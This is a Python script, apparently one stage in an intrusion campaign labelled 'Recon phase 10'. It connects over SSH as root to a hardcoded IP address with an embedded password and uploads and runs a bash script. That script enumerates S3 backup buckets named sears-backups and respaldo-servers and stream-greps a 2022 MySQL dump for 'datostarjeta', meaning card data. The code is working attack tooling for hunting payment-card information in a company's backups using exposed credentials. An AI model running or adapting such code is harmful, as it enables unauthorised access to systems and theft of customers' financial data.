"""Recon phase 10: full sears-backups listing + stream-grep 2022 dump for datostarjeta."""
import paramiko

HOST = "157.180.98.220"
USER = "root"
PASS = "?hK7L3jH76vRT7"

REMOTE_SCRIPT = r'''
#!/bin/bash
echo "=== sears-backups: ALL files (names only, unique patterns) ==="
aws s3 ls s3://sears-backups --recursive 2>&1 | awk '{print $4}' | sed 's/mysql\///' | sed 's/_[0-9]\{4\}_[0-9]\{2\}_[0-9]\{2\}\.sql//' | sort | uniq -c | sort -rn
echo ""
echo "=== sears-backups: total file count ==="
aws s3 ls s3://sears-backups --recursive 2>&1 | wc -l
echo ""
echo "=== sears-backups: latest dumps ==="
aws s3 ls s3://sears-backups --recursive 2>&1 | tail -15
echo ""
echo "=== Stream-grep newest 2022 dump for datostarjeta (max 3 min) ==="
timeout 180 aws s3 cp s3://sears-backups/mysql/app_sears10_2022_12_19.sql - 2>/dev/null | grep -m2 -o -i '.\{0,60\}datostarjeta.\{0,80\}' || echo "NO MATCH in streamed portion"
echo ""
echo "=== respaldo-servers subfolders ==="
for d in gepp gonher haro vriviera; do
  echo "--- $d ---"
  aws s3 ls s3://respaldo-servers/$d/ 2>&1 | head -8
done
'''

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(HOST, username=USER, password=PASS, timeout=30)

sftp = c.open_sftp()
with sftp.file("/tmp/recon10.sh", "w") as f:
    f.write(REMOTE_SCRIPT)
sftp.close()

stdin, stdout, stderr = c.exec_command("bash /tmp/recon10.sh", timeout=600)
out = stdout.read().decode("utf-8", errors="replace")
err = stderr.read().decode("utf-8", errors="replace")
print(out)
if err:
    print("--- STDERR ---")
    print(err)
c.close()
